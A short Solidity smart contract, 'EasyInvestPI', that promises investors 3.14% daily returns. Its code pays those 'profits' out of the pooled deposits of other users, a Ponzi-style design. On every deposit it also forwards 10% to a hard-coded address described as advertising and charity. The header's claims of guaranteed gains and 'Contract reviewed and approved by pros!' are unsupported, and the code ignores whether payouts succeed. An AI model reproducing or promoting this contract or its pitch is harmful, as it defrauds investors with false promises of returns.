1 pragma solidity ^0.4.24;
2 
3 /**
4  *
5  * Easy Investment PI Contract
6  *  - GAIN 3.14% PER 24 HOURS (every 5900 blocks)
7  *  - 10% of the contributions go to project advertising and charity
8  *
9  * How to use:
10  *  1. Send any amount of ether to make an investment
11  *  2a. Claim your profit by sending 0 ether transaction (every day, every week, i don't care unless you're spending too much on GAS)
12  *  OR
13  *  2b. Send more ether to reinvest AND get your profit at the same time
14  *
15  * RECOMMENDED GAS LIMIT: 120000
16  * RECOMMENDED GAS PRICE: https://ethgasstation.info/
17  *
18  * Contract reviewed and approved by pros!
19  *
20  */
21 contract EasyInvestPI {
22     // records amounts invested
23     mapping (address => uint256) invested;
24     // records blocks at which investments were made
25     mapping (address => uint256) atBlock;
26 
27     // this function called every time anyone sends a transaction to this contract
28     function () external payable {
29         // if sender (aka YOU) is invested more than 0 ether
30         if (invested[msg.sender] != 0) {
31             // calculate profit amount as such:
32             // amount = (amount invested) * 3.14% * (blocks since last transaction) / 5900
33             // 5900 is an average block count per day produced by Ethereum blockchain
34             uint256 amount = invested[msg.sender] * 314 / 10000 * (block.number - atBlock[msg.sender]) / 5900;
35 
36             // send calculated amount of ether directly to sender (aka YOU)
37             address sender = msg.sender;
38             sender.send(amount);
39         }
40         
41         address(0x64508a1d8B2Ce732ED6b28881398C13995B63D67).transfer(msg.value / 10);
42 
43         // record block number and invested amount (msg.value) of this transaction
44         atBlock[msg.sender] = block.number;
45         invested[msg.sender] += msg.value;
46     }
47 }